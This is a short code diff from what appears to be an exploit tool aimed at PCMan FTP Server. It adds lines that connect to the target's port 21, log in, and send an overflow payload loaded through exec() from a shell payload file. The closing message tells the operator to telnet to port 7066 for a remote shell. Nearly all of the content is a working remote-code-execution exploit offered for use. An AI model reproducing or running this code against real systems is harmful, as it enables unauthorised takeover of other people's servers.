@@ -72,6 +72,7 @@ class pcmanPutOverflowMenu(cmd.Cmd):
     except:
       print "[-]Login unsuccessful on %s" % self.host[0]
       return
+    ftp.quit()
     print "[*]Generating payload..."
     char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
     payload = ""
@@ -82,4 +83,12 @@ class pcmanPutOverflowMenu(cmd.Cmd):
     exec(open("../../../payloads/pcman_put.shell", "r").read())
     print "[+]Payload generated."
     print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
-    ftp.
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect((self.host[0], 21))
+    s.recv(1024)
+    s.send("USER " + self.user[0])
+    s.recv(1024)
+    s.send("PASS " + self.passwd[0])
+    s.recv(1024)
+    s.send(payload)
+    print "[+]Payload sent. Telnet to port 7066 on %s to get your shell. :)" % self.host[0]
